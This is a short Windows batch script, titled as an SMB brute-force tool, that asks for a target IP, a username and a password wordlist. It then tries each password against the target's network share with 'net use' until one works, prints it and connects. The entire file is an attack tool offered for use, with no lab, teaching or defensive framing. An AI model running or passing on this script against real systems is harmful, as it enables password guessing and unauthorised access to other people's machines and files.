@echo off
title SMB Bruteforce - by Renzo Skywalker
color a 
echo.
set /p ip="Enter a IP Address:"
set /p user="Enter a Username:"
set /p wordlist="Enter a password list:"

set /a count=1
for /f %%a in (%wordlist%) do (
	set pass=%%a 
	call :attempt
)
echo password not found :(
pause 
exit

:success 
echo.
echo password found! %pass%	
net use \\%ip% /user:%user% %pass% >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% equ 0 goto success
